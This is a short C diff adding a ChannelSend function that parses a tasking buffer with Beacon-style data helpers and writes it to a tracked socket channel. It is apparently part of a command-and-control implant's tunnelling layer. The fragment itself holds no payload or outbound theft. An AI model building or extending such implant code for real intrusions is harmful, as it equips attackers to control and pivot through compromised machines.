@@ -211,3 +211,49 @@ void ChannelClose(char* buffer, int length)
 		}
 	}
 }
+
+void ChannelSend(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int channelId = BeaconDataInt(&parser);
+
+	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
+	{
+		if (channel->state == CHANNEL_STATE_1 && channel->id == channelId)
+		{
+			length = BeaconDataLength(&parser);
+			buffer = BeaconDataBuffer(&parser);
+
+			fd_set exceptfds;
+			fd_set writefds;
+			int timeout = GetTickCount() + 30000;
+			struct timeval lTimeval = { 0, 100 };
+			while (GetTickCount() < timeout)
+			{
+				FD_ZERO(&writefds);
+				FD_ZERO(&exceptfds);
+
+				FD_SET((SOCKET)channel->socket, &writefds);
+				FD_SET((SOCKET)channel->socket, &exceptfds);
+
+				select(0, NULL, &writefds, &exceptfds, &lTimeval);
+	
+				if (FD_ISSET((SOCKET)channel->socket, &exceptfds))
+					break;
+
+				if (FD_ISSET((SOCKET)channel->socket, &writefds))
+				{
+					int sent = send((SOCKET)channel->socket, buffer, length, 0);
+					if (sent != SOCKET_ERROR)
+						break;
+
+					if (WSAGetLastError() != WSAEWOULDBLOCK)
+						break;
+
+					Sleep(1000);
+				}
+			}
+		}
+	}
+}
